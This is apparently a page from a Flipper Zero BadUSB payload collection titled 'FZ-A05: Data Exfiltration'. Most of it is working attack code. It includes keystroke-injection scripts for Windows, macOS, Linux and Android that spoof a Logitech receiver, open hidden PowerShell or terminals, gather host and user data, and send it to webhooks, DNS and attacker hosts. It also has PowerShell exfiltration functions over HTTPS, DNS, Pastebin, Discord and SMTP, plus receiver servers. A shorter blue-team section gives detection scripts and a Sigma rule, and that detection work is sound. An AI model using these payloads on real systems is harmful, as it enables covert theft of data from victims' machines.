# FZ-A05: Data Exfiltration

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A05 |
| **Name** | Data Exfiltration |
| **Difficulty** | Advanced |
| **Target OS** | Multi-Platform |
| **Network** | Requires outbound connectivity |
| **MITRE ATT&CK** | T1041 (Exfiltration Over C2 Channel) |

## What This Payload Does

Exfiltrates collected data from the target system to an attacker-controlled server using various covert channels. Includes techniques to bypass network security controls.

---

## Exfiltration Methods Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    Exfiltration Channels                     │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   HIGH STEALTH          MEDIUM STEALTH       LOW STEALTH     │
│   ────────────          ──────────────       ──────────      │
│   • DNS Queries         • HTTPS POST         • FTP           │
│   • ICMP Data           • Cloud Storage      • HTTP          │
│   • Steganography       • Email              • SMB           │
│   • Slow drip           • Webhook            • Raw TCP       │
│                                                               │
│   Speed: Slow           Speed: Medium        Speed: Fast     │
│   Detection: Hard       Detection: Medium    Detection: Easy │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: Data Exfiltration
REM Target: Windows 10/11
REM Action: Exfiltrates data via multiple channels
REM Network: Requires connectivity
REM Skill: Advanced
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Collect data to exfiltrate
STRINGLN $data = @{}
STRINGLN $data['hostname'] = $env:COMPUTERNAME
STRINGLN $data['user'] = $env:USERNAME
STRINGLN $data['ip'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'}).IPAddress -join ','
STRINGLN $data['domain'] = $env:USERDOMAIN

REM Convert to JSON
STRINGLN $json = $data | ConvertTo-Json -Compress

REM Method 1: HTTPS POST to webhook
STRINGLN Invoke-RestMethod -Uri "https://webhook.site/YOUR_ID" -Method POST -Body $json -ContentType "application/json"

REM Method 2: DNS exfiltration (encode data in subdomain)
STRINGLN $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data['hostname']))
STRINGLN $encoded = $encoded -replace '\+','-' -replace '/','_' -replace '=',''
STRINGLN Resolve-DnsName "$encoded.your-domain.com" -ErrorAction SilentlyContinue

STRINGLN exit
```

---

## Exfiltration Techniques

### Method 1: HTTPS POST (Common)

```powershell
# Using Invoke-RestMethod
$data = Get-Content "C:\secret\data.txt" -Raw
$bytes = [System.IO.File]::ReadAllBytes("C:\secret\file.zip")
$base64 = [Convert]::ToBase64String($bytes)

# POST as JSON
Invoke-RestMethod -Uri "https://attacker.com/receive" -Method POST -Body @{data=$base64} -ContentType "application/json"

# POST as form data
Invoke-WebRequest -Uri "https://attacker.com/upload" -Method POST -InFile "C:\secret\file.zip"
```

### Method 2: DNS Exfiltration (Stealthy)

```powershell
# Encode data in DNS queries
function Exfil-DNS {
    param($Data, $Domain)
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data))
    $encoded = $encoded -replace '\+','-' -replace '/','_' -replace '=',''

    # Split into chunks (max 63 chars per label)
    $chunks = $encoded -split '(.{60})' | Where-Object {$_}
    $seq = 0
    foreach ($chunk in $chunks) {
        $query = "$seq.$chunk.$Domain"
        Resolve-DnsName $query -DnsOnly -ErrorAction SilentlyContinue
        $seq++
        Start-Sleep -Milliseconds 500
    }
}

Exfil-DNS -Data "sensitive data here" -Domain "exfil.attacker.com"
```

### Method 3: ICMP Tunnel

```powershell
# Encode data in ICMP packets (requires raw sockets or tool)
# Using ping with data in packet (simplified)
function Exfil-ICMP {
    param($Data, $Target)
    $bytes = [Text.Encoding]::ASCII.GetBytes($Data)
    # Ping with data embedded (Windows limits this)
    ping -n 1 -l 64 $Target
}
```

### Method 4: Cloud Storage (Blend In)

```powershell
# Upload to cloud storage API
# Example: Pastebin
$content = Get-Content "C:\secret\data.txt" -Raw
$body = @{
    api_dev_key = "YOUR_API_KEY"
    api_paste_code = $content
    api_option = "paste"
}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body $body

# Example: Discord Webhook
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
$body = @{content = "Data: $content"} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json"
```

### Method 5: Email Exfiltration

```powershell
# Send via SMTP
$smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object Net.NetworkCredential("attacker@gmail.com", "app_password")
$msg = New-Object Net.Mail.MailMessage
$msg.From = "attacker@gmail.com"
$msg.To.Add("attacker@gmail.com")
$msg.Subject = "Exfil - $env:COMPUTERNAME"
$msg.Body = Get-Content "C:\secret\data.txt" -Raw
$smtp.Send($msg)
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Collect and exfil via curl
STRINGLN DATA=$(hostname && whoami && ifconfig | grep inet)
STRINGLN curl -X POST -d "data=$DATA" https://webhook.site/YOUR_ID

REM DNS exfil
STRINGLN ENCODED=$(echo "$(hostname)" | base64 | tr '+/' '-_' | tr -d '=')
STRINGLN dig $ENCODED.your-domain.com
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Collect and exfil
STRINGLN DATA=$(hostname && whoami && ip addr | grep inet)
STRINGLN curl -X POST -d "$DATA" https://webhook.site/YOUR_ID

REM DNS exfil using dig
STRINGLN ENCODED=$(echo "$(hostname)" | base64 | tr '+/' '-_' | tr -d '=')
STRINGLN dig $ENCODED.your-domain.com @8.8.8.8

REM File exfil
STRINGLN curl -F "file=@/etc/passwd" https://attacker.com/upload
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN pkg install curl -y
STRINGLN DATA="device=$(getprop ro.product.model)&user=$(whoami)"
STRINGLN curl -X POST -d "$DATA" https://webhook.site/YOUR_ID

REM Exfil photos (if accessible)
STRINGLN curl -F "file=@/sdcard/DCIM/Camera/*.jpg" https://attacker.com/upload 2>/dev/null
```

---

## Server-Side Receivers

### Python Flask Receiver

```python
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    with open('exfil.log', 'a') as f:
        f.write(f"{request.remote_addr}: {data}\n")
    return 'OK', 200

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(f'uploads/{file.filename}')
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

### DNS Server for Exfil

```python
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A
import base64

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        # Extract and decode data from subdomain
        parts = qname.split('.')
        if len(parts) > 2:
            encoded = parts[0]
            try:
                decoded = base64.b64decode(encoded.replace('-','+').replace('_','/') + '==')
                print(f"Exfil: {decoded.decode()}")
            except:
                pass
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1")))
        return reply

server = DNSServer(ExfilResolver(), port=53, address='0.0.0.0')
server.start()
```

---

## Red Team Perspective

### Channel Selection

| Channel | When to Use |
|---------|-------------|
| HTTPS | General purpose, proxy-friendly |
| DNS | High stealth, slow |
| Cloud APIs | Blends with business traffic |
| Email | When other channels blocked |
| ICMP | Firewall bypass |

### Data Prioritization

1. Credentials first (small, high value)
2. Configuration files (medium)
3. Documents (selective)
4. Bulk data last (detection risk)

### Attack Chain

```
Data Collection → Staging → Exfiltration → Cleanup
                              ↑
                          You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Network Traffic**
   - Large outbound transfers
   - Unusual DNS query patterns
   - Connections to unknown IPs

2. **Endpoint Activity**
   - File access patterns
   - Compression/encoding activity
   - PowerShell network activity

3. **DNS Analysis**
   - Long subdomain queries
   - High query volume to single domain
   - Unusual TXT record lookups

### Detection Script

```powershell
# Monitor for potential exfiltration
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'Invoke-WebRequest|Invoke-RestMethod|Net.WebClient|Convert.*Base64|Resolve-DnsName'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,400)}}
```

### Sigma Rule

```yaml
title: Data Exfiltration via PowerShell
status: experimental
description: Detects potential data exfiltration using PowerShell
logsource:
    product: windows
    category: ps_script
detection:
    selection_network:
        ScriptBlockText|contains:
            - 'Invoke-WebRequest'
            - 'Invoke-RestMethod'
            - 'Net.WebClient'
            - 'System.Net.Http'
    selection_encoding:
        ScriptBlockText|contains:
            - 'ToBase64String'
            - 'ConvertTo-Json'
            - 'Compress-Archive'
    condition: selection_network and selection_encoding
level: medium
tags:
    - attack.exfiltration
    - attack.t1041
```

### Prevention

1. **DLP Solutions**
   - Monitor outbound data
   - Block sensitive data transfer

2. **Network Controls**
   - Proxy all traffic
   - SSL inspection
   - DNS filtering

3. **Endpoint Controls**
   - Restrict PowerShell
   - Monitor file access

---

## Payload File

Save as `FZ-A05_Data_Exfiltration.txt`:

```ducky
REM FZ-A05: Data Exfiltration
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $d=@{h=$env:COMPUTERNAME;u=$env:USERNAME;ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress-notmatch'^127'}).IPAddress-join','};$j=$d|ConvertTo-Json -Compress;Invoke-RestMethod -Uri "https://webhook.site/YOUR_ID" -Method POST -Body $j -ContentType "application/json"
```

---

[← FZ-A04 Reverse Shell](FZ-A04_Reverse_Shell.md) | [Back to Advanced](README.md) | [Next: FZ-A06 Keylogger →](FZ-A06_Keylogger.md)
